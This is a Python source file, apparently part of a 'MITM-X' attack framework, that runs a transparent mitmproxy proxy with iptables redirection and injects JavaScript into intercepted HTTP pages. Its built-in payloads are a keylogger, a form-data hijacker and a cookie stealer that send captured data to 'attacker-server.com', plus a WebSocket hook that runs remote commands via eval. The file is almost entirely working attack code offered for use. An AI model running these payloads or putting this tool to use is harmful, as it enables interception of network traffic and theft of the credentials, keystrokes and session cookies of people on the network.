#!/usr/bin/env python3
"""
Payload Injector Module for MITM-X Framework
Injects JavaScript payloads into intercepted HTTP responses
"""

import os
import sys
import re
import argparse
import logging
import threading
import json
from urllib.parse import urlparse
try:
    from bs4 import BeautifulSoup
    from mitmproxy import http, options
    from mitmproxy.tools.dump import DumpMaster
except ImportError:
    print("Required packages not installed. Run: pip3 install beautifulsoup4 mitmproxy")
    BeautifulSoup = None

class PayloadInjector:
    """
    Payload Injector class to inject JavaScript into HTTP responses
    """
    
    def __init__(self, port=8080, interface="0.0.0.0"):
        """
        Initialize Payload Injector
        
        Args:
            port (int): Port to run proxy on
            interface (str): Interface to bind to
        """
        self.port = port
        self.interface = interface
        self.running = False
        self.master = None
        
        # Payload configuration
        self.payloads = {}
        self.default_payload = ""
        self.injection_targets = ["body", "head", "script"]
        
        # Setup logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)
        
        # Log file
        self.log_file = "logs/payload_injection.log"
        os.makedirs("logs", exist_ok=True)
        
        # Load default payloads
        self.load_default_payloads()
    
    def log_to_file(self, data):
        """
        Log data to file
        
        Args:
            data (str): Data to log
        """
        try:
            with open(self.log_file, 'a') as f:
                from datetime import datetime
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] {data}\n")
        except Exception as e:
            self.logger.error(f"Error writing to log file: {e}")
    
    def load_default_payloads(self):
        """
        Load default JavaScript payloads
        """
        # Basic alert payload
        self.payloads['alert'] = """
        <script>
        alert('MITM-X: Page Compromised!');
        </script>
        """
        
        # Keylogger payload
        self.payloads['keylogger'] = """
        <script>
        (function(){
            var keys = [];
            document.addEventListener('keypress', function(e) {
                keys.push(String.fromCharCode(e.which));
                if (keys.length > 50) {
                    // Send keys to attacker server
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', 'http://attacker-server.com/keys', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify({keys: keys.join('')}));
                    keys = [];
                }
            });
        })();
        </script>
        """
        
        # Form hijacker payload
        self.payloads['form_hijack'] = """
        <script>
        document.addEventListener('DOMContentLoaded', function() {
            var forms = document.getElementsByTagName('form');
            for (var i = 0; i < forms.length; i++) {
                forms[i].addEventListener('submit', function(e) {
                    var formData = new FormData(this);
                    var data = {};
                    for (var pair of formData.entries()) {
                        data[pair[0]] = pair[1];
                    }
                    
                    // Send form data to attacker server
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', 'http://attacker-server.com/forms', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify(data));
                });
            }
        });
        </script>
        """
        
        # Cookie stealer payload
        self.payloads['cookie_stealer'] = """
        <script>
        (function(){
            var cookies = document.cookie;
            if (cookies) {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', 'http://attacker-server.com/cookies', true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify({cookies: cookies, url: window.location.href}));
            }
        })();
        </script>
        """
        
        # Reverse shell payload (BeEF-like)
        self.payloads['reverse_shell'] = """
        <script>
        (function(){
            var ws = new WebSocket('ws://attacker-server.com:3000/hook');
            ws.onopen = function() {
                ws.send(JSON.stringify({
                    type: 'init',
                    data: {
                        url: window.location.href,
                        userAgent: navigator.userAgent,
                        cookies: document.cookie
                    }
                }));
            };
            
            ws.onmessage = function(event) {
                var cmd = JSON.parse(event.data);
                try {
                    var result = eval(cmd.payload);
                    ws.send(JSON.stringify({
                        type: 'result',
                        id: cmd.id,
                        data: result
                    }));
                } catch(e) {
                    ws.send(JSON.stringify({
                        type: 'error',
                        id: cmd.id,
                        error: e.toString()
                    }));
                }
            };
        })();
        </script>
        """
        
        # Set default payload
        self.default_payload = self.payloads['alert']
    
    def load_payload_from_file(self, filename):
        """
        Load payload from JavaScript file
        
        Args:
            filename (str): Path to JavaScript file
            
        Returns:
            str: Payload content
        """
        try:
            with open(filename, 'r') as f:
                content = f.read()
                return f"<script>{content}</script>"
        except Exception as e:
            self.logger.error(f"Error loading payload from {filename}: {e}")
            return ""
    
    def inject_payload_beautifulsoup(self, html_content, payload):
        """
        Inject payload using BeautifulSoup (more reliable)
        
        Args:
            html_content (str): Original HTML content
            payload (str): JavaScript payload to inject
            
        Returns:
            str: Modified HTML content
        """
        if not BeautifulSoup:
            return self.inject_payload_regex(html_content, payload)
        
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Create script tag
            script_tag = soup.new_tag('script')
            script_tag.string = payload.replace('<script>', '').replace('</script>', '')
            
            # Try to inject into head first
            if soup.head:
                soup.head.append(script_tag)
            # If no head, try body
            elif soup.body:
                soup.body.insert(0, script_tag)
            # If no body, try html
            elif soup.html:
                soup.html.append(script_tag)
            else:
                # No proper HTML structure, use regex fallback
                return self.inject_payload_regex(html_content, payload)
            
            return str(soup)
            
        except Exception as e:
            self.logger.error(f"Error injecting payload with BeautifulSoup: {e}")
            return self.inject_payload_regex(html_content, payload)
    
    def inject_payload_regex(self, html_content, payload):
        """
        Inject payload using regex (fallback method)
        
        Args:
            html_content (str): Original HTML content
            payload (str): JavaScript payload to inject
            
        Returns:
            str: Modified HTML content
        """
        try:
            # Try to inject into head
            if '</head>' in html_content.lower():
                modified_content = re.sub(r'</head>', f'{payload}</head>', html_content, flags=re.IGNORECASE)
                return modified_content
            
            # Try to inject into body
            elif '<body' in html_content.lower():
                modified_content = re.sub(r'<body([^>]*)>', f'<body\\1>{payload}', html_content, flags=re.IGNORECASE)
                return modified_content
            
            # Try to inject into html
            elif '<html' in html_content.lower():
                modified_content = re.sub(r'<html([^>]*)>', f'<html\\1>{payload}', html_content, flags=re.IGNORECASE)
                return modified_content
            
            # Last resort: prepend to content
            else:
                return payload + html_content
                
        except Exception as e:
            self.logger.error(f"Error injecting payload with regex: {e}")
            return html_content
    
    def should_inject(self, url, content_type):
        """
        Determine if payload should be injected
        
        Args:
            url (str): Request URL
            content_type (str): Response content type
            
        Returns:
            bool: True if should inject
        """
        # Only inject into HTML pages
        if not content_type.startswith('text/html'):
            return False
        
        # Skip certain domains/URLs if needed
        parsed_url = urlparse(url)
        
        # Skip HTTPS URLs (unless SSL stripping is active)
        if parsed_url.scheme == 'https':
            return False
        
        # Skip certain file extensions
        skip_extensions = ['.css', '.js', '.png', '.jpg', '.gif', '.ico', '.pdf']
        if any(parsed_url.path.lower().endswith(ext) for ext in skip_extensions):
            return False
        
        return True
    
    def response(self, flow: http.HTTPFlow) -> None:
        """
        Handle HTTP responses and inject payloads
        
        Args:
            flow: mitmproxy HTTPFlow object
        """
        try:
            if not flow.response:
                return
            
            content_type = flow.response.headers.get("content-type", "")
            url = flow.request.pretty_url
            
            # Check if we should inject
            if not self.should_inject(url, content_type):
                return
            
            # Get HTML content
            html_content = flow.response.get_text()
            if not html_content:
                return
            
            # Select payload based on URL or use default
            payload = self.default_payload
            
            # Check for specific payload assignments
            for domain, assigned_payload in self.payloads.items():
                if domain in url:
                    payload = assigned_payload
                    break
            
            # Inject payload
            modified_content = self.inject_payload_beautifulsoup(html_content, payload)
            
            if modified_content != html_content:
                flow.response.set_text(modified_content)
                self.logger.info(f"Payload injected into: {url}")
                self.log_to_file(f"Payload injected: {url}")
        
        except Exception as e:
            self.logger.error(f"Error processing response: {e}")
    
    def request(self, flow: http.HTTPFlow) -> None:
        """
        Handle HTTP requests
        
        Args:
            flow: mitmproxy HTTPFlow object
        """
        try:
            # Log requests
            self.logger.info(f"Request: {flow.request.method} {flow.request.pretty_url}")
            
        except Exception as e:
            self.logger.error(f"Error processing request: {e}")
    
    def set_payload(self, payload_name, payload_content=None):
        """
        Set payload for injection
        
        Args:
            payload_name (str): Name of the payload
            payload_content (str): Payload content (if None, use predefined)
        """
        if payload_content:
            self.payloads[payload_name] = payload_content
        elif payload_name in self.payloads:
            self.default_payload = self.payloads[payload_name]
        else:
            self.logger.error(f"Unknown payload: {payload_name}")
        
        self.logger.info(f"Payload set: {payload_name}")
    
    def add_custom_payload(self, name, content):
        """
        Add custom payload
        
        Args:
            name (str): Payload name
            content (str): JavaScript content
        """
        if not content.strip().startswith('<script>'):
            content = f"<script>{content}</script>"
        
        self.payloads[name] = content
        self.logger.info(f"Custom payload added: {name}")
    
    def start_injector(self, setup_iptables=True):
        """
        Start payload injector proxy
        
        Args:
            setup_iptables (bool): Whether to setup iptables rules
        """
        self.logger.info(f"Starting Payload Injector on {self.interface}:{self.port}")
        
        if setup_iptables:
            self.setup_iptables_redirect()
        
        try:
            # Configure mitmproxy options
            opts = options.Options(
                listen_host=self.interface,
                listen_port=self.port,
                mode="transparent"
            )
            
            # Create master
            self.master = DumpMaster(opts)
            
            # Add this addon
            self.master.addons.add(self)
            
            self.running = True
            self.logger.info("Payload Injector started")
            
            # Run the proxy
            self.master.run()
        
        except KeyboardInterrupt:
            self.logger.info("Payload Injector interrupted")
        except Exception as e:
            self.logger.error(f"Error running Payload Injector: {e}")
        finally:
            self.stop_injector(setup_iptables)
    
    def stop_injector(self, remove_iptables=True):
        """
        Stop payload injector
        
        Args:
            remove_iptables (bool): Whether to remove iptables rules
        """
        self.running = False
        
        if self.master:
            self.master.shutdown()
        
        if remove_iptables:
            self.remove_iptables_redirect()
        
        self.logger.info("Payload Injector stopped")
    
    def setup_iptables_redirect(self):
        """
        Setup iptables rules to redirect HTTP traffic to proxy
        """
        try:
            commands = [
                f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {self.port}",
                "iptables -t nat -A POSTROUTING -j MASQUERADE"
            ]
            
            for cmd in commands:
                os.system(cmd)
                self.logger.info(f"Executed: {cmd}")
        
        except Exception as e:
            self.logger.error(f"Error setting up iptables redirect: {e}")
    
    def remove_iptables_redirect(self):
        """
        Remove iptables rules
        """
        try:
            commands = [
                f"iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {self.port}",
                "iptables -t nat -D POSTROUTING -j MASQUERADE"
            ]
            
            for cmd in commands:
                os.system(cmd)
        
        except Exception as e:
            self.logger.error(f"Error removing iptables redirect: {e}")

def main():
    """
    Main function for standalone execution
    """
    parser = argparse.ArgumentParser(description="Payload Injector for MITM attacks")
    parser.add_argument("--port", "-p", type=int, default=8080, help="Proxy port")
    parser.add_argument("--interface", "-i", default="0.0.0.0", help="Interface to bind to")
    parser.add_argument("--payload", default="alert", help="Payload type to inject")
    parser.add_argument("--custom-payload", help="Custom JavaScript payload")
    parser.add_argument("--payload-file", help="Load payload from file")
    parser.add_argument("--no-iptables", action="store_true", help="Don't setup iptables rules")
    
    args = parser.parse_args()
    
    # Check if running as root
    if os.geteuid() != 0:
        print("This script requires root privileges!")
        sys.exit(1)
    
    # Create payload injector
    injector = PayloadInjector(args.port, args.interface)
    
    # Set payload
    if args.custom_payload:
        injector.add_custom_payload("custom", args.custom_payload)
        injector.set_payload("custom")
    elif args.payload_file:
        payload_content = injector.load_payload_from_file(args.payload_file)
        if payload_content:
            injector.add_custom_payload("file", payload_content)
            injector.set_payload("file")
    else:
        injector.set_payload(args.payload)
    
    try:
        injector.start_injector(not args.no_iptables)
    except KeyboardInterrupt:
        print("\nStopping Payload Injector...")
        injector.stop_injector(not args.no_iptables)

if __name__ == "__main__":
    main()
